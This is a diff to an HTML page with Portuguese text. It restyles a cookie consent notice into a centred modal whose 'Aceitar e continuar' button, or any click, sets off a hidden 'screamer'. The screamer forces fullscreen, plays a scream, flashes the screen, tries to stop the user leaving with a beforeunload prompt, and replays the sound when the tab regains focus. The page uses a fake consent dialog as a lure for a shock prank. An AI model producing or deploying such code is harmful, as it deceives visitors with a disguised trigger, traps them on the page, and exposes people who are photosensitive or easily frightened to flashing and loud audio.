@@ -13,22 +13,27 @@
       overflow: hidden;
     }
 
-    #cookie-consent {
+    #cookie-modal {
       position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 400px;
+      background: #f9f9f9;
+      border-radius: 10px;
       padding: 20px;
-      background: #f1f1f1;
-      border-top: 1px solid #ccc;
-      box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
       z-index: 1000;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
     }
 
-    #cookie-consent button {
+    #cookie-modal p {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    #cookie-modal button {
       background: #007bff;
       color: white;
       border: none;
@@ -60,9 +65,9 @@
 </head>
 <body>
 
-  <div id="cookie-consent">
-    <span>Este site usa cookies para melhorar sua experiência. Ao continuar, você aceita.</span>
-    <button id="accept-btn">Aceitar</button>
+  <div id="cookie-modal">
+    <p>Este site utiliza cookies para garantir que você tenha a melhor experiência. Ao continuar navegando, você concorda com nossos Termos de Uso e Política de Privacidade.</p>
+    <button id="accept-btn">Aceitar e continuar</button>
   </div>
 
   <div id="screamer">
@@ -71,7 +76,7 @@
   </div>
 
   <script>
-    const cookieBanner = document.getElementById('cookie-consent');
+    const cookieModal = document.getElementById('cookie-modal');
     const screamer = document.getElementById('screamer');
     const screamAudio = document.getElementById('screamAudio');
     let flashing = false;
@@ -87,26 +92,28 @@
     }
 
     function activateScreamer() {
-      if (document.fullscreenElement == null) {
-        document.documentElement.requestFullscreen().catch(console.error);
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(() => {});
       }
-      cookieBanner.style.display = 'none';
+      cookieModal.style.display = 'none';
       screamer.style.display = 'flex';
       screamAudio.play();
       startFlashing();
     }
 
-    function setUnloadProtection() {
-      window.onbeforeunload = function () {
-        return true;
-      };
-    }
+    // Impedir que o onbeforeunload pare o JS (não tem como evitar a pausa, mas reinicia ao voltar)
+    window.onbeforeunload = function () {
+      return "Tem certeza de que deseja sair?";
+    };
 
-    setUnloadProtection();
-    setInterval(setUnloadProtection, 2000);
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) {
+        screamAudio.play();
+      }
+    });
 
-    document.addEventListener('click', activateScreamer, { once: true });
     document.getElementById('accept-btn').addEventListener('click', activateScreamer);
+    document.addEventListener('click', activateScreamer, { once: true });
   </script>
 
 </body>
